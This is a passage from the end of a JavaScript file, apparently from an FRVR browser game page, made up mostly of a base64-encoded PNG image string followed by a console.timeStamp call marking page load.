/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8TANBOAAAA53RSTlMABAgJBQYHAQIDCg0PCwwOERAUFhIVGBMXGxwjJSoZHh8iGkMuISgdL1s3/kQyMTg6TZs9VsVxSnd0PqUghSeuMCw2JH1SUWHOv2RYbakpaHqVTyZ2jDRnlI34LStI5IR/QEYzgpFZPOVaoJ9Co6JL1D9myKv9sGxMXFC0xM/TZV+519xjsWuJ0TWAajnd3paX9biKO1SSsnNHvJnaytW6h05TwcfA77WOQXnbgUngu2DuXWnmzKHzbtBvwpO2t+qzqt9i/F77ftbY7evjg+HSj+d4r6zsiMuGxnVwV4vinaSYvqjDe6bBpv5bAAAOkUlEQVR42sTW2VeT1xoG8HqmHvVYtR4REpIQMgdC5oRARggQh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"]);
if (console.timeStamp) console.timeStamp('FRVR Page Load Done');